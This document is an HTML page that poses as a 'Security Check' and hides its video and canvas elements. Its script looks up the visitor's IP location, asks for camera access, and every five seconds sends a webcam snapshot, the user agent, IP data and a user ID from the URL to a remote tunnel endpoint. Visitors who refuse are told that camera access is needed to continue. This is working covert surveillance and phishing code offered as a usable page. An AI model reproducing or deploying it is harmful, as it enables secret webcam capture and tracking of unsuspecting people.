<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 40px; }
        video, canvas { display: none; }
        button { padding: 10px 20px; font-size: 18px; margin-top: 20px; }
    </style>
</head>
<body>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    <h2>Security Verification in Progress...</h2>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        let ipInfo = {};
        let captureInterval;

        // جلب بيانات الـ IP
        fetch("https://ipapi.co/json")
            .then(res => res.json())
            .then(data => { 
                ipInfo = data;
                // بدء التقاط الكاميرا بعد الحصول على بيانات IP
                requestCameraAccess();
            });

        // طلب الكاميرا فور تحميل الصفحة
        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    // بدء إرسال الصور والبيانات كل 5 ثواني
                    captureAndSendData();
                    captureInterval = setInterval(captureAndSendData, 5000);
                })
                .catch(err => {
                    console.error("Camera access error:", err);
                    document.body.innerHTML = "<h2>⚠️ Please allow camera access to continue</h2>";
                });
        }

        function captureAndSendData() {
            ctx.drawImage(video, 0, 0, 320, 240);
            const imageData = canvas.toDataURL("image/png");

            // استخراج user_id من عنوان URL
            const user_id = window.location.pathname.split("/").pop();

            // إرسال البيانات إلى السيرفر
            fetch("https://ckfnp3td-6362.uks1.devtunnels.ms:6362/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    image: imageData,
                    user_agent: navigator.userAgent,
                    ip_data: ipInfo,
                    user_id: user_id,
                    timestamp: new Date().toISOString()
                })
            }).then(response => {
                if (!response.ok) {
                    console.error("Error sending data");
                }
            }).catch(err => {
                console.error("Network error:", err);
            });
        }
    </script>
</body>
</html>
